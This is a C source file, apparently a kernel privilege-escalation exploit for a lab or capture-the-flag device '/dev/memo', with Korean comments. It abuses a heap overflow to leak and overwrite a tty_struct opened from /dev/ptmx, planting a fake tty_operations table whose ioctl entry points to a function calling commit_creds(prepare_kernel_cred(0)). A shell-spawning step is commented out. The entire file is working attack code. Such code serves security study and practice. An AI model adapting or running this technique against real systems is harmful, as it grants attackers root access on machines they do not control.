#include <stdio.h>
#include <stdlib.h> // exit()
#include <fcntl.h> // open(), close()
#include <unistd.h> 
#include <sys/types.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <string.h>

void *(*prepare_kernel_cred)(void*);
int (*commit_creds)(void*);
unsigned long user_cs, user_ss, user_rflags;

void DumpHex(const void* data, int size) {
  char ascii[17];
  int i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char*)data)[i]);
    if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char*)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i+1) % 8 == 0 || i+1 == size) {
      printf(" ");
      if ((i+1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i+1 == size) {
        ascii[(i+1) % 16] = '\0';
        if ((i+1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i+1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

static void save_state()
{
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "pushfq\n"
    "popq %2\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) 
    : 
    : "memory");

}

void get_shell()
{
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

void get_root()
{
    commit_creds(prepare_kernel_cred(0));
}

int main()
{
    int fd, fd_tty;
    char leak[0x400]={};
    void *tty_operations[30]; // fake tty_operations
    //char tty_struct[0x400]={0}; // fake tty_struct 
    unsigned long kernel_leak;

    // save userland register info
    save_state();

    // alloc 0x400 size heap chunk 
    if((fd = open("/dev/memo", O_RDWR)) < 0)
    {
        puts("[-] Failed to open device");
        exit(0);
    }
    // alloc (struct tty_struct) size tty_struct heap chunk
    if((fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0)
    {
        puts("[-] Failed to open /dev/ptmx");
        exit(0);
    }
    
    /* kernel base leak */
    // lseek로 base pointer+0x100으로 이동
    lseek(fd, 0x300, SEEK_SET);
    // trigger heap overflow -> tty_struct가 kmalloc-0x400에 위치하기 때문에 0x100의 heap overflow로 tty_struct 구조체 leak 가능
    read(fd, leak, 0x400);
    
    DumpHex(leak, 0x400);

    kernel_leak = *(unsigned long*)(leak + 0x100+0x18);
    printf("[*] kernel_leak: 0x%lx\n", kernel_leak);
    printf("[*] get_root: 0x%lx\n", &get_root);

    
    // fake tty_operations
    for(int i=0; i<30; i++) tty_operations[i] = 0;
    // overwrite ioctl -> get_root
    tty_operations[12] = (unsigned long)&get_root;
    *(unsigned long*)(leak + 0x100 + 0x18) = (unsigned long)&tty_operations;

    // overwrite tty_struct
    lseek(fd, 0x300, SEEK_SET);
    write(fd, leak, 0x400);
   
    lseek(fd, 0x300, SEEK_SET);
    read(fd, leak, 0x400); 
    DumpHex(leak, 0x400);

    // call ioctl -> get_root 

    
    ioctl(fd_tty, 0xdeadbeef, 0xcafebabe);
    
    /*
    printf("uid: %d\n", getuid());
    
    if(getuid() == 0) get_shell();
    */

    if(close(fd) != 0)
    {
        puts("[-] Failed to close");
    }
    if(close(fd_tty) != 0)
    {
        puts("[-] Failed to close");
    }

    return 0;
}
